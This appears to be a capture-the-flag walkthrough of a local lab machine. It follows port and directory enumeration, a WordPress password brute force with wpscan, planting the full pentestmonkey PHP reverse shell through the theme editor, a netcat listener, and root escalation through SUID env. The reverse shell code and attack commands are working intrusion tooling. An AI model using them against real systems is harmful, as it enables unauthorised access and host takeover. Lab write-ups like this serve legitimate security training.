# IP
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.114 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.044 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1011ms
rtt min/avg/max/mdev = 0.044/0.079/0.114/0.035 ms
```

Device is reachable by icmp protocol
Device is probably a linux OS
# Ports scanning
```sh
sudo nmap -p- -sS -sV -sC -T4 -n --min-rate 5000 -Pn -n 172.17.0.2

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-18 14:16 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 2E:76:01:FB:60:50 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```

Just one port up
- 80 running a web page in Apache2 (the name of the machine suggest this might be a CMS)
# Web enum
## Dir Fuzzing
```sh
ffuf -u "http://172.17.0.2/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -fw 3427

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3427
________________________________________________

wordpress               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 14ms]
:: Progress: [19966/19966] :: Job [1/1] :: 4878 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

```sh
gobuster dir -u http://172.17.0.2/wordpress -w /usr/share/wordlists/dirb/common.txt -x php,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/wordpress
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 200) [Size: 573]
0                    (Status: 301) [Size: 0] [--> http://172.17.0.2/wordpress/0/]
admin                (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-admin/]
dashboard            (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-admin/]
index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/wordpress/]
index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/wordpress/]
login                (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-login.php]
readme.html          (Status: 200) [Size: 7407]
wordpress            (Status: 301) [Size: 0] [--> http://172.17.0.2/wordpress/wordpress/]
wp-admin             (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-login.php?redirect_to=http%3A%2F%2F172.17.0.2%2Fwordpress%2Fwp-admin&reauth=1]
wp-blog-header.php   (Status: 200) [Size: 0]
wp-config.php        (Status: 200) [Size: 0]
wp-content           (Status: 200) [Size: 0]
wp-cron.php          (Status: 200) [Size: 0]
wp-links-opml.php    (Status: 200) [Size: 234]
wp-load.php          (Status: 200) [Size: 0]
wp-login.php         (Status: 200) [Size: 9224]
wp-mail.php          (Status: 403) [Size: 2571]
wp-settings.php      (Status: 500) [Size: 0]
wp-signup.php        (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-login.php?action=register]
wp-trackback.php     (Status: 200) [Size: 136]
xmlrpc.php           (Status: 405) [Size: 42]
xmlrpc.php           (Status: 405) [Size: 42]
Progress: 13839 / 13839 (100.00%)
===============================================================
Finished
===============================================================
```
## Wordpress enumeration
Exploring the web we found a possible system user: mario
![[Pasted image 20260918145030.png]]

## Brute force wordpress login
```sh
wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: mario, Password: love
```
## Reverse shell
We can modify a php file in the theme code editor in the admin panel we just accessed

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

```sh
sudo nc -lvnp 443
```

When accessing http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php the reverse shell will be actived

```sh
$ whoami
www-data
```
# Privilege escalation
## SUID
```sh
find / -perm -4000 2>/dev/null
/usr/bin/chsh
/usr/bin/umount
/usr/bin/env
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
```

```sh
 /usr/bin/env /bin/sh -p
 whoami
 root
```